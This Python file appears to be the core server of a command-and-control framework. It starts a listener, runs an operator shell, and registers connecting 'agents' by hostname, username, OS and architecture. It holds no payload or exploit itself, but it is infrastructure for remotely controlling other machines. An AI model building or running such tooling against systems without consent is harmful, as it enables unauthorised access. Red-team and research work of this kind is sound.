# src/server/core/server.py

from .client_manager import Manager
from .client_session import ClientSession
from commands.interact.shell import ShellManager
from config import start_print
from config import MessageType as messtype
from rich import print
import time
import subprocess
import os

class Server:

    def __init__(self, transport, serializer):

        self.__transport = transport
        self.__serializer = serializer
        self.__manager = Manager
        self.__shell = ShellManager


    def start(self):
        subprocess.run(["cls"] if os.name == 'nt' else ["clear"], shell=True)

        start_print()
        time.sleep(0.7)

        self.__transport.set_on_client(self.handle_client)
        self.__shell.set_exit_handler(self.stop)

        print(f'[bright_cyan][STARTING SERVER] ...[/bright_cyan]')
        time.sleep(0.7)
        try:
            self.__transport.start()
            print("[white]Type [blue_violet]'help'[/blue_violet] to get started.[/white]\n")
        except Exception as e:
            print(f"[bright_red][!] Something went wrong. Cannot start server\n Error: {e}[/bright_red]")
            return

        self.__shell.run()


    def handle_client(self, uuid, addr):
        session = ClientSession()
        session.set_transport(self.__transport)
        session.set_serializer(self.__serializer)
        session.set_cid(uuid)

        data = session.receive_respone()
        if data is None:
            return

        if data['type'] == messtype.REGISTER:
            Server.handle_register(addr, data['data'], session)
            session.send_request(messtype.ACK, 'ACK')
            print(f'\n[bright_green][+] Successfully registered [bright_cyan]{addr[0]}[/bright_cyan][/bright_green]')

        else:
            print(f"\n[bright_cyan]From {addr[0]}:[/bright_cyan]\n ---> {data['data']}")


    def stop(self):
        while True:
            print("[bright_red][!] EXIT SERVER ? (y/n)[/bright_red]: ", end="")
            confirm = input().strip()

            if confirm.lower() == 'n':
                return 0
            elif confirm.lower() == 'y':
                print("[bright_red][*] Exiting server...[/bright_red]")
                time.sleep(0.5)
                try:
                    from commands.agent.agent_commands import Exit

                    Exit.execute(*self.__shell.get_current_client())
                    self.__manager.drop_all_clients()
                    self.__transport.stop()
                    print(f"[bright_green][+] Successfully exit server[/bright_green]\n")
                    return 1
                except Exception as e:
                    print(f"[bright_red][!] Something went wrong.\n Error {e}[/bright_red]")
                    os._exit(1)
            else:
                print("[bright_red][!] Invalid option. Please try again [/bright_red]\n")
                time.sleep(0.5)
                continue


    @staticmethod
    def handle_register(addr, data, session):
        uuid        = data['uuid']
        hostname    = data['hostname']
        username    = data['username']
        address     = addr
        client_os   = f"{data['os']} {data['os_version']}"
        arch        = data['arch']

        Manager.add_client(uuid, hostname, username, address, client_os, arch, session)
